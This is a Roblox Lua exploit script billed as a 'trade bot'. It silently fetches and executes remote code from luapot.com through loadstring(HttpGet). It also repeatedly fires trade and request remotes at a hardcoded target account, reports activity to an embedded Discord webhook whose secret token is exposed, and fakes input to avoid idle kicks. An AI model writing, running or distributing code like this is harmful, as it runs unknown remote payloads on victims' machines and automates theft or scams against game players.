-- SUXANOX TRADE BOT - BY MX
getgenv().SECRET_KEY = "mrr_9eb6a26dba00443d9788f64c89e9d297"
getgenv().TARGET_ID = 8243624333
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502505877809401909/bu3-cEI5B-LKr63HiK47P_0xIwcFThibpuwhqYi5xA2hhs7gEYgrGdqSV3zOi56-ZyaB"

pcall(function() loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))() end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local targetId = tonumber(getgenv().TARGET_ID)

local function sendWebhook(msg)
    pcall(function()
        HttpService:PostAsync(getgenv().DISCORD_WEBHOOK, HttpService:JSONEncode({content = msg, username = "SUXANOX"}), Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
    end)
end

sendWebhook("🚀 SUXANOX AKTIF")

task.spawn(function()
    while true do
        pcall(function()
            for _, p in pairs(Players:GetPlayers()) do
                if p.UserId == targetId and p ~= Players.LocalPlayer then
                    sendWebhook("✅ Target: " .. p.Name)
                    local rs = game:GetService("ReplicatedStorage")
                    for _, r in pairs(rs:GetChildren()) do
                        pcall(function()
                            if (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) and (r.Name:lower():find("trade") or r.Name:lower():find("request")) then
                                if r:IsA("RemoteEvent") then r:FireServer(p) else r:InvokeServer(p) end
                            end
                        end)
                    end
                end
            end
        end)
        task.wait(getgenv().TRADE_CYCLE_DELAY)
    end
end)

game:GetService("Players").LocalPlayer.Idled:Connect(function()
    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

print("SUXANOX ACTIVE - BY MX")
while true do task.wait(60) end
